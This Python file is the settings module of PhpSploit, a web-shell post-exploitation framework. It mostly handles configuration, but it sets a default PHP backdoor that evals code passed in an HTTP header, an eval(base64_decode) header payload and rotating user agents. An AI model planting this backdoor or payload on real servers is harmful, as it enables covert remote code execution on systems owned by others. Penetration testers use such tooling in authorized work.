"""Phpsploit Configuration Settings"""

import os
import sys
import re
import importlib

import core
import metadict
import linebuf

from ui.color import colorize

DEFAULT_HTTP_USER_AGENT = "file://" + core.BASEDIR + "data/user_agents.lst"


# pylint: disable=too-many-instance-attributes
class Settings(metadict.VarContainer):
    """Configuration Settings

    Instanciate a dict() like object that stores PhpSploit
    session settings.

    Behavior:
    >>> Conf = Settings()
    >>> Conf.TMPPATH # call TMPPATH item (type: RandLineBuffer)
    >>> Conf["TMPPATH"] # same as above
    >>> Conf("REQ_") # display nice REQ_* vars representation
    >>> Conf.HTTP_USER_AGENT += "IE7" # add a possible TMPPATH value (random)
    >>> Conf.HTTP_USER_AGENT = "file:///tmp/useragents.lst"

    The last example binds the var's value to the file's data.

    When a setting buffer contains multiple lines, such as in
    the case of file binds, the the var's value will be randomly
    picked from valid lines.

    """
    # pylint: disable=invalid-name
    def __init__(self):
        """Declare default settings values"""
        super().__init__()
        self._settings = self._load_settings()

        # Session related
        self.TMPPATH = "%%DEFAULT%%"
        self.SAVEPATH = "%%DEFAULT%%"
        self.CACHE_SIZE = "1 MiB"
        self.VERBOSITY = False

        # Tunnel link opener
        self.TARGET = None
        self.BACKDOOR = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
        self.PROXY = None
        self.PASSKEY = "phpSpl01t"

        # System tools
        self.EDITOR = "%%DEFAULT%%"
        self.BROWSER = "%%DEFAULT%%"

        # HTTP Headers
        self.HTTP_USER_AGENT = DEFAULT_HTTP_USER_AGENT

        # HTTP Requests settings
        self.REQ_DEFAULT_METHOD = "GET"
        self.REQ_HEADER_PAYLOAD = "eval(base64_decode(%%BASE64%%))"
        self.REQ_INTERVAL = "1-10"
        self.REQ_MAX_HEADERS = 100
        self.REQ_MAX_HEADER_SIZE = "4 KiB"
        self.REQ_MAX_POST_SIZE = "4 MiB"
        self.REQ_ZLIB_TRY_LIMIT = "20 MiB"
        self.REQ_POST_DATA = ""

        # payload prefix
        self.PAYLOAD_PREFIX = "%%DEFAULT%%"

    def __setitem__(self, name, value):
        # if the set value is a *LineBuffer instance, just do it!
        if isinstance(value, linebuf.AbstractLineBuffer):
            return super().__setitem__(name, value)

        name = name.replace('-', '_').upper()
        if not self._isattr(name):
            raise KeyError("illegal name: '{}'".format(name))

        if name[5:] and name[:5] == "HTTP_":
            # HTTP_* settings have a RandLineBuffer linebuf_type
            linebuf_type = linebuf.RandLineBuffer
            # validator = self._set_HTTP_header
            validator = str
            info = self._get_HTTP_header_info(name[5:])
            # allow removal of custom HTTP_ settings, except for user agent.
            if name != "HTTP_USER_AGENT" and \
                    str(value).upper() in ["", "NONE", "%%DEFAULT%%"]:
                return super().__setitem__(name, value)
        elif name in self._settings.keys():
            linebuf_type = getattr(self._settings[name], "linebuf_type")
            validator = getattr(self._settings[name], "validator")
            default = getattr(self._settings[name], "default_value")
            info = getattr(self._settings[name], "__doc__")
        else:
            raise KeyError("illegal name: '{}'".format(name))

        # This fix creates a non-failing version of user agent default value
        if name == "HTTP_USER_AGENT" and \
                (name not in self.keys() or value == "%%DEFAULT%%"):
            if value == "%%DEFAULT%%":
                value = DEFAULT_HTTP_USER_AGENT
            try:
                value = linebuf_type(value, validator)
            except ValueError:
                alt_file = value[7:]
                alt_buff = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
                value = linebuf_type((alt_file, alt_buff), validator)
        else:
            if value == "%%DEFAULT%%":
                value = default()
            value = linebuf_type(value, validator)

        # add docstring attribute to setting
        value.docstring = self.format_docstring(name, linebuf_type, info)
        # use grandparent class (bypass parent's None feature)
        return dict.__setitem__(self, name, value)

    @staticmethod
    def _isattr(name):
        return re.match("^[A-Z][A-Z0-9_]+$", name)

    @staticmethod
    def _load_settings():
        settings = {}
        dirname = os.path.dirname(__file__)
        sys.path.insert(0, dirname)
        for file in os.listdir(dirname):
            if not re.match(r"^[A-Z][A-Z0-9_]+\.py$", file):
                continue
            name = file[:-3]
            # help(type(importlib.import_module(name)))
            # module = getattr(importlib.import_module(name), name)
            module = importlib.import_module(name)
            settings[name] = module
        sys.path.pop(0)
        return settings

    @staticmethod
    def _set_HTTP_header(value):
        return str(value)

    @staticmethod
    def _get_HTTP_header_info(name):
        hdr_name = name.replace("_", "-").title()
        result = "Define a value for %r HTTP Header field\n" % hdr_name
        if name != "USER_AGENT":
            result += ("\nUse 'None' magic string to delete this setting:\n"
                       "> set HTTP_%s None") % name
        return result

    @staticmethod
    def format_docstring(name, linebuf_type, desc):
        """formet help docstring per settings
        """
        indent = lambda buf: buf.strip().replace("\n", "\n    ")

        doc = ("\n"
               "DESCRIPTION:\n"
               "    {description}\n"
               "\n"
               "BUFFER TYPE:\n"
               "    {objtype!r}\n"
               "\n"
               "    {typedesc}")
        typedesc = linebuf_type.desc.format(var=colorize("%Lined", name))
        return doc.format(description=indent(desc),
                          objtype=linebuf_type,
                          typedesc=typedesc.strip())
